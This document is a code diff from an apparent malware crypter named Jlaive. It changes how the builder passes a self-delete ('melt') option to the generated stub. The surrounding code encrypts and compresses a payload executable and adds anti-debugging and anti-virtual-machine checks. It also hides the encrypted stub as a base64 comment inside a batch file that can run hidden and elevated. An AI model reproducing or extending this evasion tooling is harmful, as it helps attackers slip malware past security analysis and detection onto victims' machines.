@@ -95,7 +95,7 @@ namespace Jlaive
             byte[] payload_enc = Encrypt(Compress(pbytes), _key, _iv);
 
             listBox2.Items.Add("Creating stub...");
-            string stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, !isnetasm);
+            string stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, !isnetasm);
 
             listBox2.Items.Add("Building stub...");
             File.WriteAllBytes("payload.exe", payload_enc);
@@ -132,7 +132,7 @@ namespace Jlaive
             string pscommand = stubgen.CreatePS();
 
             listBox2.Items.Add("Creating batch file...");
-            string content = stubgen.CreateBat(pscommand, hidden.Checked, selfDelete.Checked, runas.Checked);
+            string content = stubgen.CreateBat(pscommand, hidden.Checked, runas.Checked);
             List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
             content_lines.Insert(rng.Next(0, content_lines.Count), ":: " + Convert.ToBase64String(stub_enc));
             content = string.Join(Environment.NewLine, content_lines);
@@ -169,7 +169,7 @@ namespace Jlaive
             textBox1.Text = obj.inputFile;
             antiDebug.Checked = obj.antiDebug;
             antiVM.Checked = obj.antiVM;
-            selfDelete.Checked = obj.selfDelete;
+            meltFile.Checked = obj.selfDelete;
             hidden.Checked = obj.hidden;
             runas.Checked = obj.runas;
             listBox1.Items.AddRange(obj.bindedFiles);
@@ -182,7 +182,7 @@ namespace Jlaive
                 inputFile = textBox1.Text,
                 antiDebug = antiDebug.Checked,
                 antiVM = antiVM.Checked,
-                selfDelete = selfDelete.Checked,
+                selfDelete = meltFile.Checked,
                 hidden = hidden.Checked,
                 runas = runas.Checked
             };
